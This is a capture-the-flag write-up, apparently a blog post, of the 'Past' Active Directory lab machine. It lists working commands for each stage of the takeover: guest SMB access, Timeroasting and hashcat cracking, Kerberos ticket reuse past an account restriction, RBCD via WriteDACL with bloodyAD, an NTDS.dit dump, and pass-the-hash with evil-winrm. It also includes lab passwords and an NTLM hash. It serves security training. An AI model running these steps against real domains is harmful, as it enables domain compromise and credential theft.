---
layout: single
title: 'Past AD Write Up - Hack Smarter'
collection: writeups
author_profile: true
date: 2026-06-29
permalink: /writeups/past/
tags: [Hack Smarter, Medium, AD, RBCD ]
---

## Overview
This write-up covers "Past," a medium-level Active Directory machine hosted on the Hack Smarter platform. This CTF is excellent practice for improving upon your Active Directory skills after the OSCP, as it features a complex delegation attack path and an uncommon, machine account exploitation vector. Which are both, to my knowledge, out of scope for the OSCP. If you get stuck or have any questions while working through the machine, don't hesitate to send me an email.

----

## Enumeration

The attacker starts by using nmap to check available services.
```bash
sudo nmap -sC -sV -p- --open 10.0.28.117 
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-23 20:37:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: PAST)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-23T20:39:29+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-A5O4OL8.past.local
| Not valid before: 2026-01-22T21:35:11
|_Not valid after:  2026-07-24T21:35:11
| rdp-ntlm-info: 
|   Target_Name: PAST
|   NetBIOS_Domain_Name: PAST
|   NetBIOS_Computer_Name: EC2AMAZ-A5O4OL8
|   DNS_Domain_Name: past.local
|   DNS_Computer_Name: EC2AMAZ-A5O4OL8.past.local
|   Product_Version: 10.0.14393
|_  System_Time: 2026-06-23T20:38:50+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49344/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: EC2AMAZ-A5O4OL8; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: EC2AMAZ-A5O4OL8
|   NetBIOS computer name: EC2AMAZ-A5O4OL8\x00
|   Domain name: past.local
|   Forest name: past.local
|   FQDN: EC2AMAZ-A5O4OL8.past.local
|_  System time: 2026-06-23T20:38:53+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-time: 
|   date: 2026-06-23T20:38:51
|_  start_date: 2026-06-23T20:06:04
```
---

The attacker then enumerates the domain environment using `enum4linux` and configures their local environment to resolve the target's network.

```bash
enum4linux-ng $IP 
```

![enum](/images/past/enum4.png)

First, the attacker maps the Domain Controller's IP address to its hostnames in the `/etc/hosts` file.

```bash
sudo nano /etc/hosts

 # Add the following line:
10.0.28.117 past.local EC2AMAZ-A5O4OL8.past.local
```

Next, the attacker must configure their local Kerberos client. They modify the `/etc/krb5.conf` file, setting `PAST.LOCAL` as the default realm and pointing it to the Domain Controller. This ensures tools like Impacket can seamlessly request and parse Kerberos tickets.

```bash                           
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = PAST.LOCAL

[realms]
    PAST.LOCAL = {
        kdc = EC2AMAZ-A5O4OL8.past.local
        admin_server = EC2AMAZ-A5O4OL8.past.local
        default_domain = past.local
    }

[domain_realm]
    past.local = PAST.LOCAL
    .past.local = PAST.LOCAL
```

Now, with the domain environment configured, the attacker uses `NetExec` to check if the Guest account is enabled and if it has access to any unauthenticated shares.

```bash
netexec smb $IP -u guest -p '' --shares 
```

The output confirms that the Guest account is enabled and reveals a non-standard share named share with READ permissions. The attacker connects directly to the share using `smbclient` and authenticating with a blank password.

![guest](/images/past/guestsmb.png)

```bash
smbclient //$IP/notes -U 'guest'
```



Upon Authenticating, the attacker lists the contents of the directory and discovers a single file named `AD_machines.txt` which appears to contain a set of usernames.

![guestshare](/images/past/guestshare.png)

```
Name            DNSHostName               
----            -----------               
EC2AMAZ-A5O4OL8 EC2AMAZ-A5O4OL8.past.local
APPDEV01                                  
WEBDEV01                                  
DEV01 
```

---


## Exploitation 

Armed with the discovered machine account usernames, the attacker initially attempts standard Active Directory attacks, including AS-REP Roasting and blind Kerberoasting. But when more common attacks fail to return any crackable hashes, the attacker is forced to pivot their strategy. After researching alternative ways to target unauthenticated machine accounts, the attacker identifies Timeroasting (an attack against the MS-SNTP protocol) as a viable exploitation vector.

Timeroasting allows an attacker to request time synchronization from a Domain Controller without any prior authentication. In response, the DC signs the NTP packet with the NTLM hash of the requested machine account, which can then be captured and cracked offline.

The attacker uses the timeroast module of `netexec`, successfully extracting the MS-SNTP hashes of four accounts.

![time](/images/past/time.png)

With the hashes successfully captured, the attacker formats them and utilizes `hashcat` with the MS-SNTP module (mode 31300) to execute a dictionary attack.

```
$sntp-ms$f043a7cedf7e51328f2701ee582a7a33$1c0111e900000000000a01784c4f434cede6dc24bf2f936be1b8428bffbfcd0aede6de15476098c7ede6de154760c10a
$sntp-ms$9f10e13e3c07a499f413e69e50dbe363$1c0111e900000000000a01794c4f434cede6dc24bfbc1c7be1b8428bffbfcd0aede6de15e3d48cb4ede6de15e3d4aff0
$sntp-ms$6d855aba05abc8483333f3ec6a824716$1c0111e900000000000a01794c4f434cede6dc24c153012ee1b8428bffbfcd0aede6de15e56b7168ede6de15e56b9b59
$sntp-ms$504dbd8b56522c9fa96f98902e0f8640$1c0111e900000000000a01794c4f434cede6dc24be3d7e0fe1b8428bffbfcd0aede6de15e66e81bdede6de15e66eabaf
```

```bash
hashcat -m 31300 hash /usr/share/wordlists/rockyou.txt 
```

With the hashes cracked, the attacker now possesses valid domain credentials. However, the Timeroasting attack returned the account's Relative Identifier (RID) rather than the account username. To determine exactly which user corresponds to the compromised account, the attacker uses `netexec` to enumerate the domain's RID mapping.

```bash
netexec smb $IP -u guest -p '' --rid
```

![rid](/images/past/rid.png)

Domain enumeration enables the correlation of the compromised RID (1115) with the corresponding user account. With the identity confirmed and valid credentials established, the attacker secures a clear vector for further exploitation.
**Username: APPDEV01$, Password: P@ssw0rd!**
 
 
Now posessing the machine account `APPDEV01$`, the attacker performs authenticated enumeration of the SMB shares.
 
The enumeration revealed that the `APPDEV01$` account holds read access to the `SYSVOL` share, a common repository for Group Policy Objects (GPOs) and administrative login scripts in an Active Directory environment.

![sysvol](/images/past/sysvol.png)

Listing the contents of the `scripts` directory revealed a file named `tyler_init.cmd`. Downloading and inspecting this file exposed a cleartext password used for an automated login process.


![sysvol2](/images/past/sysvol2.png)

```
@echo off
REM Temporary dev helper - DO NOT REMOVE
REM Tyler auto-login helper

set TYLER_USER=tyler
set TYLER_PASS=5rtfgvb%RTFGVB

REM Fake ?use? of the vars so it looks intentional
echo Initializing dev environment for %TYLER_USER%...
```

The attacker then tries to enumerate the new credentials access and sees the tyler account is restricted.
**Username: tyler, Password: 5rtfgvb%RTFGVB**

![restrict](/images/past/restrict.png)


This error indicates that while the credentials were correct, the account was likely disabled or otherwise restricted. However, Active Directory environments often behave differently when using Kerberos authentication. The attacker pivots to requesting a Kerberos TGT for the tyler user, hoping to bypass the restrictions.

```bash
getTGT.py 'past.local/tyler:5rtfgvb%RTFGVB' -dc-ip $IP
export KRB5CCNAME=tyler.ccache 
```

With the TGT successfully captured and exported, the attacker utilizes the ticket by running `netexec` with the `--use-kcache` flag. This maneuver effectively bypasses the account restriction, granting successful authentication to the target.

![cache](/images/past/kcache.png)


---


## Privilege Escalation


Before relying on broader, more time-consuming enumeration like `bloodhound`, the attacker uses `bloodyAD` to perform targeted ACL enumeration. Specifically, the `get writable` command was executed using the active Kerberos session (`-k`) to discover any objects where `tyler` possessed explicit modification or administrative rights.

```bash
bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -k get writable
```

BloodyAD successfully queried the directory and returned three distinct entries. While self-write permissions on CN=tyler are standard, the second entry reveals that tyler possesses WriteDACL permissions over the Domain Controller:

![write](/images/past/writeable.png)

Every object in Active Directory is governed by a Security Descriptor, a data structure that acts as the object's ultimate authority on access rights. At the core of this descriptor is the Discretionary Access Control List (DACL), a definitive "rulebook" made up of individual Access Control Entries (ACEs) that dictate exactly which users or groups are allowed to interact with the object and what specific actions they can perform.

Possessing the WriteDacl permission over a Domain Controller's computer object is a critical vulnerability because it grants the attacker the authority to rewrite this rulebook. Even if the attacker currently has no inherent administrative privileges over the server, WriteDacl allows them to inject a new ACE into the security descriptor, explicitly granting themselves new, highly privileged rights over the Domain Controller.

This level of control over the DACL opens up modern avenues for escalation, primarily Shadow Credentials (by granting the right to modify the msDS-KeyCredentialLink attribute) or Resource-Based Constrained Delegation (by granting the right to modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute). Given the level of access, the attacker decides to execute a Resource-Based Constrained Delegation (RBCD) attack to attempt to take over the Domain Controller.

Before proceeding, the attacker verifies the environment's configuration specifically, confirming that LDAP signing is not enforced and that the Machine Account Quota (MAQ) allowed for the creation of new computer accounts.

```bash
netexec ldap $IP --use-kcache -M maq
```



The results indicate that LDAP signing is disabled and confirm that the tyler user has the default quota to create 10 machine accounts

![rbcd1](/images/past/rbcd1.png)

The RBCD attack is initiated by creating a new machine account to act as an impersonation proxy.

```
bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -k add computer 'Edgy' 'Password'
```

Next, Using the `WriteDacl` privilege on the Domain Controller, the attacker modifies the DC’s security descriptor, updating its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to explicitly trust the new Edgy$ machine account.

```bash
bloodyAD --host EC2AMAZ-A5O4OL8.past.local -u tyler -k -d past.local add rbcd 'EC2AMAZ-A5O4OL8$' 'Edgy$'
```

With the Domain Controller now configured to trust the machine account, the attacker holds the authorization required to request service tickets on behalf of any domain user. The attacker utilizes the nxc delegation module to automate the S4U2Self and S4U2Proxy process, directly impersonating the Domain Administrator.

![rbcd2](/images/past/rbcdt.png)

While this impersonation successfully authenticates the attacker as the Administrator, this method does not guarantee a direct interactive shell, as services like WinRM are often restricted. To secure a stable, high privileged shell, the attacker pivots to credential extraction. By utilizing the `--ntds` flag within `netexec`, the attacker dumps the `NTDS.dit`, retrieving the administrative credentials necessary to finalize the domain takeover:

```bash
nxc smb EC2AMAZ-A5O4OL8.past.local -u 'Edgy$' -p 'Password' --delegate Administrator --ntds
```

After successfully extracting the domain hashes, the attacker no longer relies on delegation-based impersonation; the harvested Administrator NTLM hash provides a more stable avenue for system access. The attacker leverages this hash to authenticate via WinRM, granting a full interactive shell on the Domain Controller.

```
evil-winrm -i $IP -u administrator -H 31592a42841d0a9e74f93c41d8884cd0
```

With administrative access secured, the final objective requires retrieving the password associated with the ryan account. The attacker inspects the administrator's Powershell history file a common location to find leaked credentials and finds Ryan's password.

```bash
type C:\Users\Administrator\APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
